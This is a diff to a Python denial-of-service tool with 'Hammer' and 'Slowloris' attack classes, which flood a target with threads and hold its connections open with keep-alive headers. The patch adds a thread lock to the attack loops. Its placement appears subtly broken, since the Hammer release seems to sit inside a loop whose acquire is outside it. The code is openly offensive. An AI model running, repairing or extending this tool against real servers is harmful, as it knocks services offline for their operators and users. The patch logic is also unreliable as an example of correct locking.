@@ -9,6 +9,8 @@ import time
 import threading
 import ssl
 
+thread_lock = threading.Lock()
+
 
 def get_parameter():
     """Get Parameters function to attack target address"""
@@ -226,6 +228,9 @@ class Hammer:
         time.sleep(5)
 
         while True:
+            
+            thread_lock.acquire()
+
             for _ in range(self.turbo):
                 threading.Thread(target=self.server_down_attack, daemon=True).start()
                 threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
@@ -238,6 +243,9 @@ class Hammer:
                 task_count += 1
                 self.queue_one.put(task_count)
                 self.queue_two.put(task_count)
+                thread_lock.release()
+            
+
             self.queue_one.join()
             self.queue_two.join()
 
@@ -304,7 +312,10 @@ class Slowloris:
                 break
             list_of_sockets.append(a_socket)
         
-        while True:                
+        while True:
+            
+            thread_lock.acquire()               
+            
             print(FontColors.blue(time.ctime()), \
             FontColors.green(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}"))
             
@@ -322,8 +333,10 @@ class Slowloris:
                         list_of_sockets.append(a_socket)
                 except socket.error:
                     break
-
+                
             time.sleep(10)
+            
+            thread_lock.release()
 
 
     def create_xa_header(self) -> bytes:
